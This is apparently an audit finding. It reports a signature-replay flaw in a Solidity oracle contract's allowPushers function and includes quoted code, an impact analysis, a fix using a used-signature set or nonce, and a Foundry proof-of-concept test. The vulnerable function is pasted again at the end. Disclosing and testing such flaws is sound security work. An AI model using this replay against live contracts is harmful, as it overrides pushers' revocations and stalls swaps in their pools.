### Title
Creator can replay pusher consent signature to re-establish delegation after `revokePusher()`, causing stale prices in pusher's own pools — (File: `smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

The `allowPushers` function accepts a pusher's EIP-191 consent signature but tracks **no nonce and no used-signature set**. The only replay guard is the deadline. After a pusher calls `revokePusher()`, the creator can immediately re-establish delegation by replaying the original consent signature — as long as the deadline has not yet expired — silently redirecting all future pushes back into the creator's namespace against the pusher's will. If the pusher then pushes data intending to populate their own namespace (and their own pools), every word lands in the creator's namespace instead, leaving the pusher's pools with a permanently stale oracle price that reaches live swaps.

---

### Finding Description

`allowPushers` verifies the pusher's signature and writes `namespaceRemapping[pusher] = msg.sender`:

```solidity
// CompressedOracle.sol lines 192-212
function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
    _ensureDeadline(deadline);
    ...
    bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
    );
    require(pusher == ECDSA.recover(hash, signatures[i]));
    namespaceRemapping[pusher] = msg.sender;   // ← no guard on prior state
    ...
}
```

`revokePusher` clears the mapping:

```solidity
// CompressedOracle.sol lines 238-243
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
```

There is **no nonce, no used-signature bitmap, and no check that `namespaceRemapping[pusher] == address(0)`** before re-writing the mapping. The code's own NatSpec comment acknowledges the replay risk — *"an undated signature could re-establish a delegation AFTER the pusher revoked it"* — and claims the deadline is the fix. But the deadline only blocks replay **after it expires**; before expiry the identical `(deadline, pusher, creator)` tuple is accepted an unlimited number of times.

The fallback push path resolves the namespace at call time:

```solidity
// CompressedOracle.sol lines 315-316
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
```

So every push the pusher makes after revocation — intending to populate their own namespace — is silently redirected to the creator's namespace the moment the creator replays the signature. [1](#0-0) [2](#0-1) [3](#0-2) 

---

### Impact Explanation

The pusher's `revokePusher()` call is rendered permanently ineffective for the lifetime of the deadline. Every push the pusher makes lands in the creator's namespace, not their own. The pusher's own `feedIdOf(pusher, slotIndex, positionIndex)` feeds receive zero updates; their `timestampMs` stays at the last pre-revocation value. Any pool whose `AnchoredPriceProvider` is bound to those feeds will read a stale `refTime`, trip the `_isStale` guard, and return `(0, type(uint128).max)` — the `FeedStalled` sentinel — halting all swaps on that pool until the pusher either accepts re-delegation or the deadline expires. ---

### Likelihood Explanation

Medium. The creator already holds the original consent signature (they submitted it in the first `allowPushers` call). No additional off-chain material is needed. The attack is a single on-chain transaction executable at any time before the deadline. Deadlines are typically set days-to-months in the future, giving a long exploitation window. The pusher has no on-chain defense short of waiting for the deadline to expire.

---

### Recommendation

Add a used-signature set or a per-pusher nonce to `allowPushers` so each consent signature is consumed exactly once:

```solidity
mapping(bytes32 => bool) private _usedConsents;

function allowPushers(...) external {
    ...
    bytes32 hash = ...; // existing hash
    require(!_usedConsents[hash], "consent already used");
    _usedConsents[hash] = true;
    require(pusher == ECDSA.recover(hash, signatures[i]));
    namespaceRemapping[pusher] = msg.sender;
}
```

Alternatively, reject re-delegation when the pusher is already mapped to a different creator (`require(namespaceRemapping[pusher] == address(0))`), forcing the creator to obtain a fresh signature after any revocation.

### Proof of Concept

```solidity
function test_allowPushers_replayAfterRevoke() external {
    // 1. Pusher signs consent for creator with a 1-year deadline
    uint256 deadline = block.timestamp + 365 days;
    bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

    address[] memory pushers = new address[](1);
    pushers[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    // 2. Creator establishes delegation
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator);

    // 3. Pusher revokes — intends to push into own namespace for own pools
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0));

    // 4. Creator replays the SAME signature — no nonce, no used-sig check
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs); // succeeds!
    assertEq(oracle.namespaceRemapping(pusher), creator); // revocation undone

    // 5. Pusher's subsequent pushes land in creator's namespace, not their own
    uint56 tsMs = uint56(block.timestamp * 1000);
    uint48 raw = _packRaw(1_000_000, 5, 3);
    vm.prank(pusher);
    (bool ok,) = address(oracle).call(_wordAt(0, 0, raw, tsMs));
    assertTrue(ok);

    // Pusher's own namespace stays empty → their pools see stale price → FeedStalled
    assertEq(oracle.getOracleData(oracle.feedIdOf(pusher, 0, 0)).price, 0);
    // Creator's namespace received the push
    assertGt(oracle.getOracleData(oracle.feedIdOf(creator, 0, 0)).price, 0);
}

    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
